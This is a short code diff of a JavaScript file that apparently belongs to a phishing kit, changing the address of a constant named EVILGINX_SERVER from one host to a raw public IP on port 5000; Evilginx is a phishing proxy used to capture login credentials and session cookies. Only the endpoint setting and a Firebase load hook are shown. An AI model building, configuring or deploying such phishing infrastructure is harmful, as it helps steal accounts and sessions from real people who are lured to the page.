@@ -1,7 +1,7 @@
 console.log("✅ script.js loaded successfully");
 
 // Set your Evilginx server (update with your actual domain or public IP and port)
-const EVILGINX_SERVER = "http://tecan.com.co:5000";
+const EVILGINX_SERVER = "http://3.149.242.245:5000";
 
 // Wait for Firebase to load before executing functions.
 document.addEventListener("DOMContentLoaded", function () {
